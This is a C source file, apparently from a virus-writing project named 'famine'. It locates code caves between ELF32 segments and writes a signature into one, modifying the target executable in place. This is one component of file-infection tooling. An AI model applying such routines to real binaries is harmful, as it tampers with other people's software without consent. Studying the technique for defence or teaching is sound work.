#include "famine.h"

#include <elf.h> // Elf32_Phdr
#include <stdint.h> // uintN_t, UINT32_MAX
#include <string.h> // memcpy()

static uint32_t elf32_find_next_segment(Elf32_Phdr *phdr, uint16_t phnum,
                                        uint16_t index)
{
	uint32_t curr, next, tmp;

	curr = phdr[index].p_offset;
	next = UINT32_MAX;

	for (uint32_t i = 0; i < phnum; i++) {
		if (i == index)
			continue ;

		tmp = phdr[i].p_offset;
		if (tmp > curr && tmp < next)
			next = tmp;
	}
	return (next);
}

int sign_elf32_cavity(t_file *file, t_elf32 *elf32)
{
	uint32_t cave_start, cave_end;

	for (uint32_t i = 0; i < elf32->ehdr->e_phnum; i++) {
		if (elf32->phdr[i].p_offset > file->size)
			continue ;
		if (elf32->phdr[i].p_filesz
		    > file->size - elf32->phdr[i].p_offset)
			continue ;

		cave_start = elf32->phdr[i].p_offset + elf32->phdr[i].p_filesz;
		cave_end = elf32_find_next_segment(elf32->phdr,
		                                   elf32->ehdr->e_phnum,
		                                   (uint16_t)i);

		if (cave_end == UINT32_MAX)
			continue ;
		if (cave_end <= cave_start)
			continue ;
		if (cave_end - cave_start < SIGNATURE_SIZE)
			continue ;
		if (SIGNATURE_SIZE > file->size - cave_start)
			continue ;

		memcpy(file->map + cave_start, SIGNATURE, SIGNATURE_SIZE);
		return (0);
	}
	return (1);
}
